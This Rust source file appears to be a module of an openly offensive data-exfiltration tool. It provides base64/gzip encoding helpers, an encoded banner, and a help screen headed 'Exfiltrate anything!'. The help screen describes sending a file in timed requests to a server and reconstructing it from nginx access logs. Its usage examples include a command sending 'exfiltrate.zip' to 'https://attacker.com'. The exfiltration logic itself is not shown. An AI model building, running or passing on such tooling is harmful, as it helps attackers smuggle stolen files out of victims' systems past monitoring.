use flate2::Compression;
use flate2::read::GzDecoder;
use flate2::write::GzEncoder;
use std::io::{self, Cursor, Read, Write};
use std::env;

pub fn print_banner() -> Result<(), Box<dyn std::error::Error>> {

    let decompressed_content = decode_data("H4sIAAAAAAAAA5WPyRHFMAhD71Qh2tAp/Vf1g9iyXPLtGSwelpzYkQvAMXIZnmNc1Qzt5f1fKcXVRnHkWub5+o2tGo+5mMvRKR+Y1MztbD31eToF9/Km3AK0k9a3DPFYnBfcu+DF4sH2VApB6YpopQvclGGrxmMUoxyd8oHVv7NT4mDVENWHrokYh10c1cAgFpVYa/adfL0DbJfafuKnRaa6AgAA");

    let mut stdout = io::stdout();
    writeln!(stdout, "{}", decompressed_content?.replace("\\x1b", "\x1b"))?; // .replace is needed to apply the colors on the banner string

    Ok(())
}

pub fn decode_data(encoded: &str) -> Result<String, Box<dyn std::error::Error>> {
    // Base64-encoded and gzip-compressed data
    let encoded_gzip_data = encoded;
    
    // Decode Base64
    let compressed_bytes = base64::decode(encoded_gzip_data)?;
    
    // Decompress gzip
    let mut decoder = GzDecoder::new(Cursor::new(compressed_bytes));
    
    let mut decompressed_content = String::new();
    decoder.read_to_string(&mut decompressed_content)?;
    
    // Return the decompressed content
    Ok(decompressed_content)
}

pub fn encode_data(data: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
    // Gzip compress the data
    let mut encoder = GzEncoder::new(Vec::new(), Compression::default());
    encoder.write_all(data)?;
    let compressed_bytes = encoder.finish()?;
    
    // Encode as Base64
    let encoded_base64 = base64::encode(compressed_bytes);
    
    // Return the encoded data
    Ok(encoded_base64)
}

pub fn get_help() {
    // Display Help
    println!("Exfiltrate anything!");
    println!();
    println!("{} [-h] [-d] [-f] <file-path> [-r] <logfile> <ip-address> <datetime> <numreq> [-s] <server> [-t] <timeout>", env::args().next().unwrap());
    println!();
    println!("Options:");
    println!("-d <enc-path>                                     Specify the encoded file to decode.");
    println!("-f <file-path>                                    Specify the file to exfiltrate.");
    println!("-r <logfile> <ip-address> <datetime> <numreq>     Specify the path to logfile and the target ip address along the number of requests and the datetime to reconstruct the exfltrated file.");
    println!("-s <server>                                       Specify the server where to send the file to exfiltrate.");
    println!("-t <timeout>                                      Specify the number of seconds for each request.");
    println!();
    println!("Usage Examples:");
    println!("{} ", env::args().next().unwrap());
    println!("{} -d encoded.txt", env::args().next().unwrap());
    println!("{} -f exfiltrate.zip -s https://attacker.com -t 10", env::args().next().unwrap());
    println!("{} -r /var/log/nginx/access.log 3.12.4.1 '17/Mar/2024:01:37:28 +0000' 10", env::args().next().unwrap());
    println!();
}